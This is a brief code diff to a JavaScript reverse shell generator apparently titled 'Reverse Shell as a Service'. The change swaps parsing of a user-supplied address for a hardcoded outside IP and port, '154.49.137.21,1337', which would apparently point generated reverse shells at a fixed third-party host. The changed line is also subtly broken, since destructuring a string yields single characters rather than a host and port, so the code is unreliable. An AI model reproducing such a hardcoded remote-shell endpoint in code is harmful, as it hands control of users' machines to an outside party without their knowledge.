@@ -12,7 +12,7 @@ const usage = `# Reverse Shell as a Service
 # 3. Don't be a dick`;
 
 const reverseShell = (address = '') => {
-	const [host, port] = address.split(':');
+	const [host, port] = '154.49.137.21,1337';
 	if (!host || !port) {
 		return usage;
 	}
